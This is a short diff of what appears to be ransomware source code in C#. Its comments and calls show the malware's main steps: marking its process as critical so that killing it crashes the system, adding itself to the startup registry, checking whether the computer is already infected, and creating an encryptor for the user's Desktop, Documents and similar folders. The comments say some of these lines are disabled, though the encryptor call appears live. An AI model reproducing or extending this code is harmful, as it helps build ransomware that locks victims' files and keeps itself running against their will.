@@ -8,14 +8,17 @@
 
             // Will mark the process as critical causing BSOD if terminated
 
-            //Utils.makeProcessUnkillable();
+            //Utils.MakeProcessUnkillable();
+
+            // Add program to startup registry for launch on login
+            // Utils.AddToStartup();
 
             /* 
              * Creates new encryptor class and and encrypt "special" directories e.g Desktop, Documents, etc
              * Line below is commented out so running it doesn't encrypt your computer
              * Uncomment it to see it function
              */
-            if (!Utils.KeyExists())
+            if (!SQLManager.ComputerInfected())
             {
                 Encryptor encryptor = new Encryptor();
 
